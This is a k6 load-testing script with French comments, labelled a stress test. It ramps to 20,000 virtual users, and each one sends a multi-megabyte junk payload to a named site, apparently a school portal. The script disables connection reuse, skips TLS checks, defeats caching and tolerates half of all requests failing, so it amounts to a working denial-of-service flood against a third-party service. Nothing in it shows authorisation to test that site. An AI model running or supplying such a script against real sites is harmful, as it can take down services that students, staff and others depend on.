import http from 'k6/http';
import { check } from 'k6';

export let options = {
  stages: [
    { duration: '5s', target: 5000 },   // montée rapide
    { duration: '10s', target: 15000 },  // charge lourde
    { duration: '45s', target: 20000 },  // charge extrême
  ],

  thresholds: {
    http_req_failed: ['rate<0.50'],       // accepte jusqu'à 50% d'erreurs
    http_req_duration: ['p(99)<10000'],  // 99% < 10s
  },

  // augmente la puissance réseau
  insecureSkipTLSVerify: true,
  noConnectionReuse: true,
};

// Génération d’un payload énorme (~5–15 MB)
function massivePayload() {
  return JSON.stringify({
    user: "stress-test",
    id: Math.random().toString(36).slice(2),
    timestamp: Date.now(),
    junk: new Array(600000).fill("XXXXXXXXXX").join(""), // string énorme
    matrix: Array.from({ length: 30000 }, () => Math.random()),
  });
}

export default function () {
  const url = "https://moncollege-valdoise.fr";

  const payload = massivePayload(); // recalculé à chaque requête → surpression CPU

  const headers = {
    "Content-Type": "application/json",
    "X-Test": Math.random().toString(), // anti-cache
  };

  const res = http.post(url, payload, { headers });

  check(res, {
    "status OK": (r) => r.status === 200,
  });
}